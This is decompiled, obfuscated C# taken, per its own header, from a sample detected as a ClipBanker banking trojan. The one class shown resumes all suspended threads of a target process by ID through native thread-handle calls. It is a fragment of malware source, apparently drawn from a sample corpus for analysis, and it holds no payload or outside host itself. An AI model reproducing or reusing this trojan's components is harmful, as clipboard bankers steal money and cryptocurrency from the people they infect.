// Decompiled with JetBrains decompiler
// Type: o1y.5Ty
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using I71;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace o1y
{
  internal sealed class \u0035Ty : x77
  {
    private readonly string D22;
    private readonly int \u00311T;

    [SpecialName]
    public string \u0039eZ() => this.D22;

    [SpecialName]
    public int \u003967() => this.\u00311T;

    public \u0035Ty(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        Process processById = Process.GetProcessById(Convert.ToInt32(obj1));
        if (processById.ProcessName != string.Empty)
        {
          foreach (ProcessThread thread in (ReadOnlyCollectionBase) processById.Threads)
          {
            if (thread.ThreadState == ThreadState.Wait && thread.WaitReason == ThreadWaitReason.Suspended)
            {
              IntPtr num = \u0036b9.A7G.\u0037Oq(\u0036b9.A7G.\u0035lj.\u0023b, false, (uint) thread.Id);
              if (!(num == IntPtr.Zero))
              {
                do
                  ;
                while (\u0036b9.A7G.\u0035sl(num) > 0);
                \u0036b9.B61(num);
              }
            }
          }
        }
        this.\u00311T = 0;
      }
      catch (Exception ex)
      {
        this.D22 = ex.Message;
        this.\u00311T = 1;
      }
    }
  }
}
